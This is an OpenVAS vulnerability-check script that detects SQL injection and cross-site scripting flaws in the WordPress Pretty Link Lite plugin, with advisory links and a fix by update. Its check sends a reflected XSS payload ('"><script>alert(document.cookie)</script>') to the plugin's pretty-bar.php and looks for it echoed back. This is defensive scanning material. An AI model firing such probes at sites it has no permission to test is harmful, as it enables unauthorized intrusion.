###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Pretty Link Lite Plugin SQL Injection And XSS Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802857");
  script_version("2020-05-08T08:34:44+0000");
  script_bugtraq_id(53531);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)");
  script_tag(name:"creation_date", value:"2012-05-17 11:13:01 +0530 (Thu, 17 May 2012)");
  script_name("WordPress Pretty Link Lite Plugin SQL Injection And XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/47121");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75630");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/47121");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/112693/wpprettylinklite-sqlxss.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause SQL Injection
  attack and gain sensitive information or insert arbitrary HTML and script
  code, which will be executed in a user's browser session in the context of
  an affected site.");

  script_tag(name:"affected", value:"WordPress Pretty Link Lite Plugin version 1.5.2 and prior");

  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied input to,

  - 'url' parameter to pretty-bar.php script and 'k' parameter to
    rli-bookmarklet.php script.

  - 'page' parameter to '/wp-admin/admin.php', which allows attacker to
    manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"Update to Pretty Link Lite Plugin version 1.5.4 or later.");

  script_tag(name:"summary", value:"This host is running WordPress with Pretty Link Lite plugin and is
  prone to sql injection and cross site scripting vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/pretty-link/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + '/wp-content/plugins/pretty-link/pretty-bar.php?url="><script>alert(document.cookie)</script>';

if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:"<script>alert\(document\.cookie\)</script>", extra_check: make_list("Pretty Link","WordPress"))){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
